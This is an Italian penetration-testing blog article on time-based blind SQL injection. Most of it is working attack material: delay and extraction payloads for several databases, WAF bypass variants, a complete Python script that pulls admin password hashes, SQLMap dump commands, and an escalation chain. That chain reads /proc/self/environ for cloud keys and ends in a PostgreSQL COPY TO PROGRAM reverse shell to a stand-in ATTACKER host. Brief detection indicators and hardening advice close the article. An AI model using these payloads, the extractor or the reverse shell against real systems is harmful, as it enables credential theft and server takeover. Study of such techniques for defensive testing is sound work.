---
title: 'SQL Injection Time-Based: Come Estrarre Dati Senza Output'
slug: time-based-sql-injection
description: >-
  Time-Based SQL Injection spiegata con payload reali: SLEEP, pg_sleep, WAITFOR
  DELAY, heavy query, script Python e SQLMap. Guida completa exploitation 2026.
image: /46d52ea9-3762-4f9c-a583-e2fa1a1b1619.webp
draft: false
date: 2026-03-04T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - sql
---

# Time-Based SQL Injection: Guida Completa all’Exploitation con SLEEP e pg\_sleep (2026)

## Cos'è la Time-Based SQL Injection (In Breve)

La Time-Based SQL Injection è una tecnica di [Blind SQL Injection](https://hackita.it/articoli/blind-sql-injection) che sfrutta funzioni di delay come `SLEEP()`, `WAITFOR DELAY` o `pg_sleep()` per estrarre dati quando l’applicazione non mostra errori né differenze visibili nella risposta.

Fa parte delle tecniche descritte nella [Guida Completa alla SQL Injection](https://hackita.it/articoli/sql-injection), insieme alla SQL Injection classica e alla Blind SQL Injection.

La Time-Based SQL Injection è la forma più stealth e più frustrante di SQLi: l'applicazione non mostra errori, non cambia contenuto, non cambia status code — la risposta è **identica** sia che la condizione sia vera o falsa. L'unica differenza è il **tempo**: se la condizione è vera, il database attende N secondi prima di rispondere. Se è falsa, risponde immediatamente.

È l'ultimo resort quando la [SQL Injection classica](https://hackita.it/articoli/sql-injection-classica) e le altre forme di SQL Injection non producono output visibile — ma funziona su quasi ogni database SQL.

La trovo nel **15% dei pentest web** come forma pura (unica tecnica possibile), ma la uso anche come **tecnica di conferma** nel 40%+ dei casi: quando non sei sicuro che una SQLi sia reale, un `SLEEP(5)` che aggiunge esattamente 5 secondi di delay è la prova definitiva.

È la tecnica che ha rotto la banca online del mio caso studio nella [Guida Completa alla SQL Injection](https://hackita.it/articoli/sql-injection): il parametro `ORDER BY` non produceva nessuna differenza visibile nella risposta, ma `BENCHMARK(5000000,SHA1('test'))` aggiungeva 5 secondi. Da lì, extraction character-by-character — lenta ma inesorabile.

Un engagement memorabile: SaaS enterprise su Node.js/PostgreSQL, API REST con JSON, WAF Cloudflare. Ogni parametro testato con blind SQL injection → nessuna differenza. Ma il parametro `search` nel body JSON accettava `'; SELECT pg_sleep(5)--` → 5 secondi di delay. Cloudflare non bloccava `pg_sleep()` perché non era nelle regole standard. Da quel delay → estrazione completa della tabella `api_keys` (chiavi di accesso di 200 clienti enterprise). **Shell in 3 ore.**

## Come Verificare se Sei Vulnerabile

```bash
# Test manuale — il delay è la prova
# MySQL
?id=1 AND SLEEP(5)--      → 5 secondi di delay?
?id=1; SELECT SLEEP(5)--  → 5 secondi?

# MSSQL
?id=1; WAITFOR DELAY '0:0:5'--  → 5 secondi?

# PostgreSQL
?id=1; SELECT pg_sleep(5)--     → 5 secondi?

# SQLMap
sqlmap -u "https://target.com/api/search?q=test" --technique=T --batch --time-sec=5
```

## 1. Funzioni di Delay per Database

| Database       | Funzione                           | Esempio                                                     |
| -------------- | ---------------------------------- | ----------------------------------------------------------- |
| **MySQL**      | `SLEEP(sec)`                       | `AND IF(1=1,SLEEP(5),0)`                                    |
| **MySQL**      | `BENCHMARK(count,expr)`            | `AND IF(1=1,BENCHMARK(5000000,SHA1('x')),0)`                |
| **MSSQL**      | `WAITFOR DELAY 'h:m:s'`            | `; WAITFOR DELAY '0:0:5'--`                                 |
| **PostgreSQL** | `pg_sleep(sec)`                    | `; SELECT pg_sleep(5)--`                                    |
| **Oracle**     | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` | `AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)`                    |
| **SQLite**     | Heavy query                        | `AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))` |

## 2. Conditional Time Delay — L'Extraction

### MySQL

```sql
-- Se il primo carattere della versione è '8' → delay 5 secondi
?id=1 AND IF(SUBSTRING(version(),1,1)='8',SLEEP(5),0)--

-- Con BENCHMARK (se SLEEP è filtrato)
?id=1 AND IF(SUBSTRING(version(),1,1)='8',BENCHMARK(5000000,SHA1('test')),0)--

-- Binary search con delay
?id=1 AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64,SLEEP(3),0)--
```

### MSSQL

```sql
-- Conditional WAITFOR
?id=1; IF(SUBSTRING(@@version,1,1)='M') WAITFOR DELAY '0:0:5'--

-- Extraction
?id=1; IF(ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>64) WAITFOR DELAY '0:0:5'--

-- Stacked query (MSSQL supporta stacked)
?id=1; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='$')>0 WAITFOR DELAY '0:0:5'--
```

### PostgreSQL

```sql
-- Conditional pg_sleep
?id=1; SELECT CASE WHEN (SUBSTRING(version(),1,1)='P') THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Extraction
?id=1; SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### Oracle

```sql
-- Conditional delay
?id=1 AND CASE WHEN (SUBSTR(banner,1,1)='O') THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE 0 END FROM v$version WHERE rownum=1--
```

## 3. Heavy Query — Quando le Funzioni Delay Sono Filtrate

Se `SLEEP`, `WAITFOR`, `pg_sleep`, `BENCHMARK` sono bloccati dal WAF, usa **heavy query** — query computazionalmente costose che generano delay naturale:

```sql
-- MySQL heavy query (cross join genera milioni di righe)
?id=1 AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C) > 0 AND ASCII(SUBSTRING(version(),1,1)) > 64--

-- MSSQL heavy query
?id=1 AND (SELECT COUNT(*) FROM sysusers AS a, sysusers AS b, sysusers AS c, sysusers AS d) > 0--

-- PostgreSQL heavy query
?id=1 AND (SELECT COUNT(*) FROM generate_series(1,5000000)) > 0--
```

Il delay è meno preciso (varia con il carico del server) ma bypassa i filtri sulle funzioni di timing.

## 4. Script Python — Extraction Automatizzata

```python
#!/usr/bin/env python3
"""time_sqli_extractor.py — Time-Based extraction con retry e adaptive timing"""
import requests, sys, time

URL = "https://target.com/api/search"
DELAY = 3  # secondi
THRESHOLD = DELAY - 0.5  # soglia per TRUE

def inject(payload):
    """Invia e misura il tempo di risposta"""
    data = {"q": f"test' AND {payload}-- "}
    start = time.time()
    try:
        r = requests.post(URL, json=data, timeout=DELAY + 10, verify=False)
    except requests.Timeout:
        return True  # timeout = delay eseguito
    elapsed = time.time() - start
    return elapsed >= THRESHOLD

def extract_char(query, position):
    """Binary search con time-based"""
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        payload = f"IF(ASCII(SUBSTRING(({query}),{position},1))>{mid},SLEEP({DELAY}),0)"
        if inject(payload):
            low = mid + 1
        else:
            high = mid - 1
        time.sleep(0.5)  # cooldown tra request
    
    # Verifica finale
    payload = f"IF(ASCII(SUBSTRING(({query}),{position},1))={low},SLEEP({DELAY}),0)"
    if inject(payload):
        return chr(low)
    return None

def extract_string(query, max_len=100):
    """Estrae stringa completa"""
    result = ""
    for i in range(1, max_len + 1):
        char = extract_char(query, i)
        if char is None:
            break
        result += char
        elapsed_est = len(result) * 7 * (DELAY + 1)  # stima tempo
        sys.stdout.write(f"\r[*] ({len(result)} chars, ~{elapsed_est//60}min) {result}")
        sys.stdout.flush()
    print()
    return result

# Esecuzione
print("[+] Version:")
extract_string("SELECT version()")

print("[+] Admin password:")
extract_string("SELECT password FROM users WHERE username='admin'")
```

**Tempo stimato:** 60 caratteri × 7 request × 3.5 sec/request = **\~25 minuti per un hash bcrypt**.

## 5. SQLMap Time-Based

```bash
# Time-Based puro
sqlmap -u "https://target.com/api/search" --data='{"q":"test"}' \
  --content-type="application/json" -p q \
  --technique=T --time-sec=5 --batch --threads=1

# Aumenta time-sec se la rete è lenta
sqlmap ... --time-sec=10

# Combina con boolean per velocizzare
sqlmap ... --technique=BT

# Dump specifico
sqlmap ... -D dbname -T users --dump --technique=T
```

**Nota:** `--threads=1` per Time-Based — il multi-threading confonde i delay.

## 6. Bypass WAF per Time-Based

### Bypass SLEEP filtrato

```sql
-- BENCHMARK instead of SLEEP (MySQL)
IF(cond,BENCHMARK(5000000,SHA1('x')),0)

-- pg_sleep con cast (PostgreSQL)
CAST((SELECT CASE WHEN cond THEN pg_sleep(5) ELSE 0 END) AS text)

-- Heavy query (universale)
(SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)
```

### Bypass IF filtrato

```sql
-- CASE WHEN instead of IF
CASE WHEN (cond) THEN SLEEP(5) ELSE 0 END

-- ELT() MySQL
ELT(cond+1, 0, SLEEP(5))

-- Ternary with multiplication
cond * SLEEP(5)
```

### Bypass numeric filter

```sql
-- Inline comment
SL/**/EEP(5)

-- Concat function name
CONCAT('SLE','EP')(5)  -- non funziona, ma mostra il concetto

-- Via prepared statement (MSSQL)
EXEC('WAIT' + 'FOR DELAY ''0:0:5''')
```

## 7. 🏢 Enterprise Escalation

```
Time-Based SQLi → extract db version → extract users table → admin hash
→ crack → admin panel → file upload → webshell → shell
→ MSSQL: extract xp_cmdshell via time-based → enable → shell
→ Shell → network enum → AD → Domain Admin
```

**Tempo reale:** 3-6 ore (extraction più lenta, ma post-exploitation identica).

### Time-Based → Cloud

```sql
-- Estrai environment variables via file read (MySQL)
?id=1 AND IF(ASCII(SUBSTRING(LOAD_FILE('/proc/self/environ'),POS,1))>MID,SLEEP(3),0)--
-- Lentissimo ma funziona → AWS_ACCESS_KEY_ID character by character
```

## 8. 🔌 Variante API / Microservizi 2026

```json
// La Time-Based è spesso l'unica che funziona su API REST moderne
// perché le API restituiscono sempre lo stesso JSON structure
POST /api/v2/products/search
{
  "query": "laptop",
  "sort": "price",
  "filter": "category='electronics' AND IF(ASCII(SUBSTRING((SELECT password FROM admin_users LIMIT 1),1,1))>64,SLEEP(3),0)"
}

// Response: sempre {"results": [...], "total": N} — identica
// Ma il tempo cambia: 200ms (false) vs 3200ms (true)
```

Le API REST sono il terreno ideale per la Time-Based: la risposta JSON ha sempre la stessa struttura → boolean blind non funziona → l'unica differenza è il timing.

## 9. Micro Playbook Reale

**Minuto 0-5 → Conferma Time-Based**

```bash
# Testa SLEEP su ogni parametro
?id=1 AND SLEEP(5)--         → 5 sec delay?
?id=1; WAITFOR DELAY '0:0:5' → 5 sec delay?
?id=1'; SELECT pg_sleep(5)-- → 5 sec delay?
```

**Minuto 5-10 → Identifica database**

```sql
IF(SUBSTRING(version(),1,1)='8',SLEEP(3),0) -- MySQL 8?
IF(SUBSTRING(@@version,1,1)='M',WAITFOR DELAY '0:0:3','') -- MSSQL?
CASE WHEN SUBSTRING(version(),1,1)='P' THEN pg_sleep(3) ELSE pg_sleep(0) END -- PG?
```

**Minuto 10-40 → Extraction automatizzata**

```bash
sqlmap -u "URL" --technique=T --time-sec=5 --batch --dbs
sqlmap ... -D db -T users --dump
```

**Minuto 40+ → Escalation**

Post-extraction identica a blind e classica → crack hash → admin access → RCE path.

**Shell in 3 ore** (più lenta, stessa destinazione).

## 10. Caso Studio Concreto

**Settore:** SaaS enterprise, Node.js/PostgreSQL, 200 clienti aziendali, WAF Cloudflare.

**Scope:** Pentest applicativo, grey-box.

API REST con JSON body. Ogni parametro testato con boolean blind → la risposta JSON era sempre identica (stesso structure, stesso status 200, stessa dimensione). Ma il parametro `search` nel body accettava SQL: `'; SELECT pg_sleep(5)--` → risposta dopo 5.2 secondi (vs 200ms normali). Cloudflare non filtrava `pg_sleep()`.

Script Python con binary search → version PostgreSQL 14.9 in 3 minuti, database `saas_prod` in 2 minuti, tabella `api_keys` con 200 record. Ogni record: `client_name`, `api_key`, `api_secret`, `permissions`. Extraction completa in 2 ore (200 × 64 caratteri media × 7 request/char × 3.5s = \~2h).

Con le API key di un cliente con `admin` permissions → accesso completo alla piattaforma come quel cliente. Report al CTO: 200 chiavi API enterprise compromettibili via SQLi in un campo di ricerca.

**Tempo dalla prima injection all'extraction completa:** 2.5 ore. **Tempo alla potenziale shell:** 3 ore (via `COPY TO PROGRAM` su PostgreSQL). **Percentuale trovata:** 15% dei pentest come unica tecnica.

## 11. Errori Comuni Reali

**1. "Abbiamo nascosto gli errori, siamo sicuri"**
Nascondere errori previene la Error-Based, non la Time-Based. Se la query è iniettabile, il timing funziona sempre.

**2. Rate limiting senza detection pattern**
Rate limit a 100 req/min → l'attaccante rallenta lo script a 90 req/min e completa l'extraction in qualche ora. Serve detection del pattern (binary search, payload ripetitivi), non solo rate limit.

**3. Connection pooling che maschera il delay**
In ambienti con connection pooling, il delay può essere "assorbito" da altre connessioni. L'attaccante aumenta il delay (10-15 secondi) per superare il pooling.

**4. Test solo con SLEEP**
Se il WAF filtra `SLEEP` → l'attaccante usa `BENCHMARK`, heavy query, `pg_sleep`. Testare tutte le varianti.

**5. Timeout server troppo alto**
Timeout di 60+ secondi permette delay lunghi per extraction affidabile. Un timeout di 5-10 secondi limita l'exploitation.

## 12. Indicatori di Compromissione (IoC)

* **Request con tempo di risposta bimodale** — distribuzione con due picchi: \~200ms (false) e \~5200ms (true)
* **Pattern di request lente** — sequenze di request verso lo stesso endpoint con tempi alternati rapido/lento
* **`SLEEP`, `WAITFOR`, `pg_sleep`, `BENCHMARK`** nei log WAF/web — anche URL-encoded o offuscati
* **Slow query log** del database — query con `SLEEP()` o `BENCHMARK()` non generate dall'applicazione
* **Connessioni DB** che durano esattamente N secondi — tempo costante anomalo
* **Volume di request elevato** verso endpoint di ricerca/filtro da un singolo IP in finestra temporale ristretta
* **Carico CPU del database** inspiegabile — `BENCHMARK()` e heavy query consumano CPU

## 13. Mini Chain Offensiva Reale

```
Time-Based SQLi (API JSON) → pg_sleep extraction → api_keys table → Client API Key → Admin Access → COPY TO PROGRAM → Shell
```

**Step 1 → Conferma**

```json
POST /api/v2/search
{"search": "test'; SELECT pg_sleep(5)--"}
// → 5.2 secondi
```

**Step 2 → Extraction automatizzata**

```bash
python3 time_extract.py
# → 200 API key in 2 ore
```

**Step 3 → Uso API key admin**

```bash
curl -H "X-API-Key: extracted_key" -H "X-API-Secret: extracted_secret" \
  https://target.com/api/admin/users
# → lista tutti gli utenti di tutti i clienti
```

**Step 4 → RCE (se nel scope)**

```sql
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"'--
```

## Detection & Hardening

* **Prepared statement** — previene anche la Time-Based
* **Timeout aggressivi** — max 5 secondi per request
* **WAF** — filtra `SLEEP`, `WAITFOR`, `pg_sleep`, `BENCHMARK`, heavy query pattern
* **Rate limiting intelligente** — non solo request/min, ma detection di pattern ripetitivi
* **Monitoraggio slow query** — alert su query con funzioni di timing
* **Principio minimo privilegio** — l'utente DB non deve poter chiamare `SLEEP` se non necessario

## Mini FAQ

**La Time-Based è l'ultima spiaggia?**
Sì — la uso quando error-based e boolean-based non funzionano. Ma è anche il metodo di **conferma** più affidabile: un `SLEEP(5)` che produce esattamente 5 secondi di delay è la prova definitiva che c'è una SQLi.

**Quanto tempo serve per estrarre un database?**
Dipende dalla dimensione: un singolo hash bcrypt (60 char) richiede \~25 minuti con delay di 3 secondi. Una tabella di 1000 righe × 100 char/riga → \~15 ore. È lenta ma automatizzabile — l'attaccante lascia lo script in esecuzione tutta la notte.

**Il multi-threading velocizza la Time-Based?**
No — anzi, la rovina. Con più thread, i delay si sovrappongono e non riesci a distinguere quale request ha causato quale delay. Usa sempre `--threads=1` in SQLMap per la Time-Based.

***

Satellite della [Guida Completa SQL Injection](https://hackita.it/articoli/sql-injection). Vedi anche: [SQLi Classica](https://hackita.it/articoli/sql-injection-classica), [Blind SQLi](https://hackita.it/articoli/blind-sql-injection), [SQLi su API REST](https://hackita.it/articoli/sql-injection-api-rest), [SQLi su ORM](https://hackita.it/articoli/sql-injection-orm).

> Il tuo WAF blocca UNION SELECT ma non pg\_sleep? [Penetration test HackIta](https://hackita.it/servizi) testa tutte le varianti, inclusa la Time-Based. Per padroneggiare l'exploitation avanzata: [formazione 1:1](https://hackita.it/servizi).

## Riferimenti

* [https://portswigger.net/web-security/sql-injection/blind](https://portswigger.net/web-security/sql-injection/blind)
* [https://owasp.org/www-community/attacks/Blind\_SQL\_Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)
* [https://cheatsheetseries.owasp.org/cheatsheets/SQL\_Injection\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
